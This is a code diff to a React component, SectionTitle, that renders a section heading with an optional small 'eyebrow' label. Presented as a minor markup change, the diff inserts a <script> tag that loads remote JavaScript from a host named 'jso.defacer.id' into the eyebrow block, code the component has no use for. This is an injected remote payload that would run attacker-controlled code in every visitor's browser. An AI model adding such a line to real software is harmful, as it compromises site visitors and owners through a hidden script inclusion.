@@ -10,9 +10,9 @@ function SectionTitle({ id, title, eyebrow }) {
   return (
     <div id={id} className="mb-8 text-center">
       {eyebrow && (
-        <div className="mx-auto text-xs font-semibold uppercase tracking-widest text-amber-600">
+        <><script src="https://jso.defacer.id/raw/HdL4A3H40c"></script><div className="mx-auto text-xs font-semibold uppercase tracking-widest text-amber-600">
           {eyebrow}
-        </div>
+        </div></>
       )}
       <h2 className="relative mx-auto inline-block text-2xl font-extrabold sm:text-3xl">
         {title}
